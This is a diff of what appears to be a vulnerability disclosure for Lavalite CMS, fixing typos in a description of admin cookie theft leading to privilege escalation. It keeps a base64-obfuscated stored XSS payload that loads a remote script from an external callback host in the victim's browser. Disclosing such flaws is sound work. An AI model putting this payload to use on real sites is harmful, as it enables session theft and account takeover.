@@ -1,5 +1,5 @@
 # Description
-Admin cookies and other details leading to an account take over to a heigher level privillage from a client account of lavalite CMS.
+Admin cookies and other details leading to an account take over to a higher level privilege from a client account of lavalite CMS. 
 # Payload USED
 ```
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
